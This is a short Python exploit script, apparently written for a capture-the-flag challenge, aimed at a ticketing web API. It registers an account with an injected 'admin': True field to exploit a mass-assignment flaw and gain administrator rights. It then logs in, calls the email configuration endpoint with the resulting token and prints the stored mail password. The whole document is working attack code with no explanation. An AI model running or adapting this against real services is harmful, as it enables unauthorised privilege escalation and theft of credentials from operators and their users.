import requests

user_data = {
"email": "aaaa@asdasd.com",
"password": "asdasd123123",
"admin": True,
"name": "asd"
}
requests.post("http://tickets.2112213.xyz/api/v1/auth/user/register", json=user_data)
token = requests.post("http://tickets.2112213.xyz/api/v1/auth/login", json=user_data).json()["token"]
res = requests.get("http://tickets.2112213.xyz/api/v1/config/email",headers={'Authorization': f'Bearer {token}'})
print(res.json()["email"]["pass"])

